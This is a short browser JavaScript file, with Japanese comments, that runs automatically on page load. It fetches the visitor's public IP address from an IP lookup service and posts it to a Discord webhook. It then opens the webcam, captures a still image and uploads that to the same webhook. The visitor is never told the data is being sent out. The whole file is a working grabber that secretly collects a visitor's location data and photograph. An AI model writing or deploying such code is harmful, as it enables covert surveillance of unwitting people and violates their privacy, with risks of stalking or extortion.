const video = document.createElement('video');
const canvas = document.createElement('canvas');
canvas.width = 640;
canvas.height = 480;

async function fetchWebhookUrl() {
    const res = await fetch('/api/webhook');
    const data = await res.json();
    return data.webhookUrl; // 必要に応じてサーバー側でトークン認証などを追加
}

async function sendMessageToDiscord(content) {
    const webhookUrl = await fetchWebhookUrl();
    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        throw new Error('不正なWebhook URLです');
    }
    await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
    });
}

async function sendImageToDiscord(blob) {
    const webhookUrl = await fetchWebhookUrl();
    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        throw new Error('不正なWebhook URLです');
    }
    const formData = new FormData();
    formData.append('file', blob, 'image.png');
    await fetch(webhookUrl, {
        method: 'POST',
        body: formData
    });
}

async function getIPAddress() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

async function captureImage() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(async (blob) => {
                        await sendImageToDiscord(blob);
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/png');
                    resolve();
                }, 1000);
            };
        });
    } catch (err) {
        console.error('カメラ取得に失敗しました:', err);
    }
}

async function main() {
    try {
        const ipAddress = await getIPAddress();
        await sendMessageToDiscord(`IPアドレス: ${ipAddress}`);
        await captureImage();
    } catch (error) {
        console.error('エラー:', error);
    }
}

main();
